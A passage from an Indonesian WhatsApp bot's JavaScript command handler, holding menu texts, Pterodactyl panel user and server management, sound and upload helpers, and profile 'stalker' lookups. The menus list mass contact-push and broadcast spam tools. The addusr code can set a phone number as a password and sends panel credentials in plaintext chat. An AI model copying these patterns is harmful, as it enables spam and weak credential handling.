々 ${prefix}shadow  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}write  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}romantic  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}burnpaper  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}smoke  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}narutobanner  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}love  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}undergrass  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}doublelove  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}coffecup  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}underwaterocean  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}smokyneon  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}starstext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}rainboweffect  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}balloontext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}metalliceffect  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}embroiderytext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}flamingtext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}stonetext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}writeart  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}summertext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}wolfmetaltext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}nature3dtext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}rosestext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}naturetypography  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}quotesunder  *ᴘʀᴇᴍɪᴜᴍ*
└ ◦ ${prefix}shinetext  *ᴘʀᴇᴍɪᴜᴍ*

*𖣂 E P H O T O  M A K E R ッ*

々 ${prefix}glitchtext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}writetext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}advancedglow  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}typographytext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}pixelglitch  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}neonglitch  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}flagtext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}flag3dtext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}deletingtext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}blackpinkstyle  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}glowingtext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}underwatertext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}logomaker  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}cartoonstyle  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}papercutstyle  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}watercolortext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}effectclouds  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}blackpinklogo  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}gradienttext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}summerbeach  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}luxurygold  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}multicoloredneon  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}sandsummer  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}galaxywallpaper  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}1917style  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}makingneon  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}royaltext  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}freecreate  *ᴘʀᴇᴍɪᴜᴍ*
々 ${prefix}galaxystyle  *ᴘʀᴇᴍɪᴜᴍ*
└ ◦ ${prefix}lighteffects  *ᴘʀᴇᴍɪᴜᴍ*
    
Powered By *${global.ownername}*`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kyuuThumb,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'menupush': {
     if (!isRegistered) return replygcxeon('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
var unicorn = await getBuffer(picak+'push Menu')
sendKyuuMessage(from, { 
text: `*ʜᴀʟᴏ ᴋᴀᴋ , @${sender.split("@")[0]} 👋.*
ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ᴡʜᴀᴛꜱᴀᴩᴩ ᴏᴛᴏᴍᴀᴛɪꜱ yᴀɴɢ ᴅᴀᴩᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴇʟᴀᴋᴜᴋᴀɴ ꜱᴇꜱᴜᴀᴛᴜ, ᴍᴇɴᴄᴀʀɪ ᴅᴀɴ ᴍᴇɴᴅᴀᴩᴀᴛᴋᴀɴ ᴅᴀᴛᴀ ᴀᴛᴀᴜ ɪɴꜰᴏʀᴍᴀꜱɪ ᴍᴇʟᴀʟᴜɪ ᴡʜᴀᴛꜱᴀᴩᴩ.

𖣂 *I N F O - B O T*
   ⛩️*ʙᴏᴛ ɴᴀᴍᴇ* : *${global.botname}*
   ⛩️*ᴠᴇʀꜱɪᴏɴ* : *6*
   ⛩️*ʙᴀɪʟᴇyꜱ* : *@adiwashing/baileys*
   ⛩️*ᴏᴡɴᴇʀ* : *${global.namaku}*


𖣂 *I N F O* 
   ⛩️*ᴏᴡɴᴇʀ* = For Owner
   ⛩️*ɢʀᴏᴜᴘ* = For Group
   ⛩️*ғʀᴇᴇ* = For Free User
   ⛩️*ᴘʀᴇᴍɪᴜᴍ* = For Premium User

*𖣂  P U S H  M E N U ッ*  

┌ ◦ ${prefix}pushcontact  *ᴏᴡɴᴇʀ*
々 ${prefix}pushcontactv2  *ᴏᴡɴᴇʀ*
々 ${prefix}savecontact  *ᴏᴡɴᴇʀ*
々 ${prefix}pushmember  *ᴏᴡɴᴇʀ*
々 ${prefix}idgc  *ᴏᴡɴᴇʀ*
└ ◦ ${prefix}jpm  *ᴏᴡɴᴇʀ*

Powered By *${global.ownername}*`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kyuuThumb,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case "addusr": {
if (!isOwner) return replygcxeon(mess.owner)
let t = text.split(',');
if (t.length < 3) return replygcxeon(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag\n\nExample: linsbot@gmail.com,Zanxbotz,Zanxbotz,628xxx`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return replygcxeon(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag\n\nExample: linsbot@gmail.com,Zanxbotz,Zanxbotz,628xxx`);
let d = (await Kyuu.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return replygcxeon(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await Kyuu.sendMessage(m.chat, { text: `
*SUCCES ADD USER*

 ID: ${user.id}
 UUID: ${user.uuid}
 USERNAME: ${user.username}
 EMAIL: ${user.email}
 NAME: ${user.first_name} ${user.last_name}
 LANGUAGE: ${user.language}
 ADMIN: ${user.root_admin}

*Password telah dikirim di private chat @${u.split`@`[0]}*`, mentions:[u],
})
Kyuu.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
 LOGIN: ${domain}
 USERNAME: ${username}
 PASSWORD: ${password.toString()}
 EMAIL: ${email}

NOTE📃 : *HARAP SIMPAN BAIK" KARENA DATA INI HANYA DI KIRIM 1X DAN ADMIN TIDAK BERTANGGUNG JAWAB*
*JIKA DATA HILANG*`,
})
}
break
case "listusr": {
if (!isOwner) return replygcxeon(mess.owner)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let users = res.data
let sections = []
for (let user of users) {
let u = user.attributes
replygcxeon(`*LIST PANEL*

TOTAL USER: ${res.meta.pagination.count}

Id: ${u.id}
Nama: ${u.username}
`)
}}
break
case "detusr": {
if (!isOwner) return replygcxeon(mess.owner)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json()
if (res.errors) return replygcxeon('*USER TIDAK DITEMUKAN*')
let u = res.attributes
replygcxeon(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``)
}
break
case "listsrv": {
if (!isOwner) return replygcxeon(mess.owner)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data
let sections = []
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
replygcxeon(`*LIST SERVER*

ID: ${s.id}
NAMA: ${s.name}
`)
}
}
break
case "addsrv": {

if (!isOwner) return replygcxeon(mess.owner)
let s = text.split(',');
if (s.length < 7) return replygcxeon(`*Format salah!*

Penggunaan:
${prefix + command} name, deskripsi,userId,eggId,locationId,memory/disk,cpu

Example: addsrv lins,26 Desember 2018,9,15,1,1000/1000,100`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return replygcxeon(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
replygcxeon(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break

case "delsrv": {

if (!isOwner) return replygcxeon(mess.owner)
let srv = args[0]
if (!srv) return replygcxeon('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return replygcxeon('*SERVER NOT FOUND*')
replygcxeon('*SUCCESSFULLY DELETE THE SERVER*')
}
break

case "detsrv": {
if (!isOwner) return replygcxeon(mess.owner)
let srv = args[0]
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
if (res.errors) return replygcxeon('*SERVER NOT FOUND*')
let s = res.attributes
let f2 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f2.json();
let t = data.attributes
replygcxeon(`*${s.name.toUpperCase()} SERVER DETAILS*

STATUS: ${t.current_state}

ID: ${s.id}
UUID: ${s.uuid}
NAME: ${s.name}
DESCRIPTION: ${s.description}
MEMORY: ${await (format(t.resources.memory_bytes)).toString()} / ${s.limits.memory === 0 ? 'Unlimited' : s.limits.memory + 'MB'}
DISK: ${await (format(t.resources.disk_bytes)).toString()} / ${s.limits.disk === 0 ? 'Unlimited' : s.limits.disk + 'MB'}
CPU: ${t.resources.cpu_absolute}% / ${s.limits.cpu === 0 ? 'Unlimited' : s.limits.cpu + '%'}
CREATED AT: ${s.created_at}`)
}
break
case 'menuanti': {
     if (!isRegistered) return replygcxeon('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
var unicorn = await getBuffer(picak+'Anti Menu')
sendKyuuMessage(from, { 
text: `*ʜᴀʟᴏ ᴋᴀᴋ , @${sender.split("@")[0]} 👋.*
ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ᴡʜᴀᴛꜱᴀᴩᴩ ᴏᴛᴏᴍᴀᴛɪꜱ yᴀɴɢ ᴅᴀᴩᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴇʟᴀᴋᴜᴋᴀɴ ꜱᴇꜱᴜᴀᴛᴜ, ᴍᴇɴᴄᴀʀɪ ᴅᴀɴ ᴍᴇɴᴅᴀᴩᴀᴛᴋᴀɴ ᴅᴀᴛᴀ ᴀᴛᴀᴜ ɪɴꜰᴏʀᴍᴀꜱɪ ᴍᴇʟᴀʟᴜɪ ᴡʜᴀᴛꜱᴀᴩᴩ.

𖣂 *I N F O - B O T*
   ⛩️*ʙᴏᴛ ɴᴀᴍᴇ* : *${global.botname}*
   ⛩️*ᴠᴇʀꜱɪᴏɴ* : *6*
   ⛩️*ʙᴀɪʟᴇyꜱ* : *@adiwashing/baileys*
   ⛩️*ᴏᴡɴᴇʀ* : *${global.namaku}*


𖣂 *I N F O* 
   ⛩️*ᴏᴡɴᴇʀ* = For Owner
   ⛩️*ɢʀᴏᴜᴘ* = For Group
   ⛩️*ғʀᴇᴇ* = For Free User
   ⛩️*ᴘʀᴇᴍɪᴜᴍ* = For Premium User

*𖣂 A N T I  M E N U ッ*

┌ ◦ ${prefix}antilinkgc  *ɢʀᴏᴜᴘ*
々 ${prefix}antiwame  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinkall  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinktiktok  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinkfb  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinktwitter  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinkig  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinktg  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinkytvid  *ɢʀᴏᴜᴘ*
々 ${prefix}antilinkytch  *ɢʀᴏᴜᴘ*
々 ${prefix}antivirus  *ɢʀᴏᴜᴘ*
々 ${prefix}antitoxic  *ɢʀᴏᴜᴘ*
々 ${prefix}antilink  *ɢʀᴏᴜᴘ*
└ ◦ ${prefix}antiwame  *ɢʀᴏᴜᴘ*

Powered By *${global.ownername}*`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kyuuThumb,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
Kyuu.sendMessage(from, {quoted : fakestatus })
break
case 'menugame': {
     if (!isRegistered) return replygcxeon('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
var unicorn = await getBuffer(picak+'Bug Menu')
sendKyuuMessage(from, { 
text: `*ʜᴀʟᴏ ᴋᴀᴋ , @${sender.split("@")[0]} 👋.*
ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ᴡʜᴀᴛꜱᴀᴩᴩ ᴏᴛᴏᴍᴀᴛɪꜱ yᴀɴɢ ᴅᴀᴩᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴇʟᴀᴋᴜᴋᴀɴ ꜱᴇꜱᴜᴀᴛᴜ, ᴍᴇɴᴄᴀʀɪ ᴅᴀɴ ᴍᴇɴᴅᴀᴩᴀᴛᴋᴀɴ ᴅᴀᴛᴀ ᴀᴛᴀᴜ ɪɴꜰᴏʀᴍᴀꜱɪ ᴍᴇʟᴀʟᴜɪ ᴡʜᴀᴛꜱᴀᴩᴩ.

𖣂 *I N F O - B O T*
   ⛩️*ʙᴏᴛ ɴᴀᴍᴇ* : *${global.botname}*
   ⛩️*ᴠᴇʀꜱɪᴏɴ* : *6*
   ⛩️*ʙᴀɪʟᴇyꜱ* : *@adiwashing/baileys*
   ⛩️*ᴏᴡɴᴇʀ* : *HenzzXD*


𖣂 *I N F O* 
   ⛩️*ᴏᴡɴᴇʀ* = For Owner
   ⛩️*ɢʀᴏᴜᴘ* = For Group
   ⛩️*ғʀᴇᴇ* = For Free User
   ⛩️*ᴘʀᴇᴍɪᴜᴍ* = For Premium User

 *𖣂  G A M E   M E N U ッ* 
 
々 ${prefix}tebak gambar
々 ${prefix}tebak lirik
々 ${prefix}tebak lagu
々 ${prefix}tebak kalimat
々 ${prefix}tebak kata
々 ${prefix}tebak Bendera
々 ${prefix}tebak Bendera2
々 ${prefix}tebak Kabupaten
々 ${prefix}tebak Kimia
々 ${prefix}tebak Asahotak
々 ${prefix}tebak Siapakahaku
々 ${prefix}tebak Susunkata
々 ${prefix}tebak Tekateki
々 ${prefix}math
々 ${prefix}math Noob
々 ${prefix}math Easy
々 ${prefix}math Medium
々 ${prefix}math Hard
々 ${prefix}math Extreme
々 ${prefix}math Impossible
々 ${prefix}math Impossible2

Powered By *${global.ownername}*`,
mentions:[sender, mark],
contextInfo:{
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kyuuThumb,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
Kyuu.sendMessage(from, {quoted : fakestatus })
break
case 'menuowner': {
     if (!isRegistered) return replygcxeon('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
var unicorn = await getBuffer(picak+'Owner Menu')
sendKyuuMessage(from, { 
text: `*ʜᴀʟᴏ ᴋᴀᴋ , @${sender.split("@")[0]} 👋.*
ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ᴡʜᴀᴛꜱᴀᴩᴩ ᴏᴛᴏᴍᴀᴛɪꜱ yᴀɴɢ ᴅᴀᴩᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴇʟᴀᴋᴜᴋᴀɴ ꜱᴇꜱᴜᴀᴛᴜ, ᴍᴇɴᴄᴀʀɪ ᴅᴀɴ ᴍᴇɴᴅᴀᴩᴀᴛᴋᴀɴ ᴅᴀᴛᴀ ᴀᴛᴀᴜ ɪɴꜰᴏʀᴍᴀꜱɪ ᴍᴇʟᴀʟᴜɪ ᴡʜᴀᴛꜱᴀᴩᴩ.

𖣂 *I N F O - B O T*
   ⛩️*ʙᴏᴛ ɴᴀᴍᴇ* : *${global.botname}*
   ⛩️*ᴠᴇʀꜱɪᴏɴ* : *6*
   ⛩️*ʙᴀɪʟᴇyꜱ* : *@adiwashing/baileys*
   ⛩️*ᴏᴡɴᴇʀ* : *${global.namaku}*


𖣂 *I N F O* 
   ⛩️*ᴏᴡɴᴇʀ* = For Owner
   ⛩️*ɢʀᴏᴜᴘ* = For Group
   ⛩️*ғʀᴇᴇ* = For Free User
   ⛩️*ᴘʀᴇᴍɪᴜᴍ* = For Premium User

𖣂 *O W N E R  M E N U *
 
┌ ◦ ${prefix}self  *ᴏᴡɴᴇʀ*
々 ${prefix}public  *ᴏᴡɴᴇʀ*
々 ${prefix}join  *ᴏᴡɴᴇʀ*
々 ${prefix}bctext  *ᴏᴡɴᴇʀ*
々 ${prefix}bcimage  *ᴏᴡɴᴇʀ*
々 ${prefix}bcvideo  *ᴏᴡɴᴇʀ*
々 ${prefix}creategc  *ᴏᴡɴᴇʀ*
々 ${prefix}setexif  *ᴏᴡɴᴇʀ*
々 ${prefix}shutdown  *ᴏᴡɴᴇʀ*
々 ${prefix}autostickergc  *ᴏᴡɴᴇʀ*
々 ${prefix}setppbot  *ᴏᴡɴᴇʀ*
々 ${prefix}addprem  *ᴏᴡɴᴇʀ*
々 ${prefix}delprem  *ᴏᴡɴᴇʀ*
々 ${prefix}addowner  *ᴏᴡɴᴇʀ*
々 ${prefix}delowner  *ᴏᴡɴᴇʀ*
々 ${prefix}addvn  *ᴏᴡɴᴇʀ*
々 ${prefix}delvn  *ᴏᴡɴᴇʀ*
々 ${prefix}addsticker  *ᴏᴡɴᴇʀ*
々 ${prefix}delsticker  *ᴏᴡɴᴇʀ*
々 ${prefix}addimage  *ᴏᴡɴᴇʀ*
々 ${prefix}delimage  *ᴏᴡɴᴇʀ*
々 ${prefix}addvideo  *ᴏᴡɴᴇʀ*
々 ${prefix}delvideo  *ᴏᴡɴᴇʀ*
々 ${prefix}block add  *ᴏᴡɴᴇʀ*
々 ${prefix}unblock del  *ᴏᴡɴᴇʀ*
└ ◦ ${prefix}leavegc  *ᴏᴡɴᴇʀ*

Powered By *${global.ownername}*`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kyuuThumb,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
Kyuu_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await Kyuu.sendMessage(m.chat, { audio: Kyuu_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'searchfriend':{
if (!isPrem) return replyprem(mess.premium)
let teman = pickRandom(xeonverifieduser)
setTimeout(() => {
replygcxeon(mess.wait)
}, 1000)
setTimeout(() => {
replygcxeon('Managed to Get One Person')
}, 5000)
setTimeout(() => {
Kyuu.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
me = m.sender
teks = `Buy Sc t.me/runlinux`
sendKyuuMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'tourl': {
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await Kyuu.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
replygcxeon(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
replygcxeon(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'q': case 'quoted': {
if (!m.quoted) return replygcxeon('Reply the Message!!')
let xeonquotx= await Kyuu.serializeM(await m.getQuotedObj())
if (!xeonquotx.quoted) return replygcxeon('The message you are replying to is not sent by the bot')
await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
         case 'tts': case 'say':{
         	if (!text) replygcxeon(`Example : ${prefix + command} text`)
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_english?query=${text}`)
             Kyuu.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3` }, { quoted: m })
         	}
         break
case 'igstalk':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcxeon(`Example ${prefix+command} unicorn_xeon`)
replygcxeon(mess.wait)
aj = await igstalk(`${q}`)
Kyuu.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Instagram Stalker \\*

Full name : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case 'ffstalk':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcxeon(`Example ${prefix+command} 946716486`)
replygcxeon(mess.wait)
eeh = await ffstalk.ffstalk(`${q}`)
replygcxeon(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcxeon(`Example ${prefix+command} 530793138|8129`)
replygcxeon(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcxeon(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
